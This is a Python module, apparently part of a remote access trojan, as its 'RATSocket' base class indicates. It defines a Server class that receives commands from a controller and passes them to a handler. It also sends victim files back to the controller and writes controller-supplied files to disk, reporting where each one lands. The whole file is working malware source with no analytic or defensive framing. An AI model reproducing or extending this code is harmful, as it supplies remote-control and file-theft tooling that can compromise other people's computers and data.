import ntpath
import os

from entity.ratsocket import RATSocket
from util.common_util import decode


class Server(RATSocket):

    def __init__(self):
        super().__init__()

    # 向服务端发送执行结果
    def send_result(self, status: int, result: str):
        body = result.encode()
        head = {
            'type': 'result',
            'status': status,
            'length': len(body)
        }
        self.send(head, body)

    # 向服务端发送文件
    def send_file(self, filename: str):
        head = {
            'type': 'file',
            'filename': ntpath.basename(filename),
            'length': os.stat(filename).st_size
        }
        with open(filename, 'rb') as file:
            self.send(head, file.read())

    # 从服务端接收命令或文件
    def recv_command(self, command_handler):
        head, body = self.recv()
        if head['type'] == 'command':
            command_handler(decode(body))
        elif head['type'] == 'file':
            try:
                with open(head['filename'], 'wb') as file:
                    file.write(body)
                self.send_result(1, 'File uploaded to: {}'.format(os.path.abspath(head['filename'])))
            except Exception as e:
                self.send_result(0, str(e))
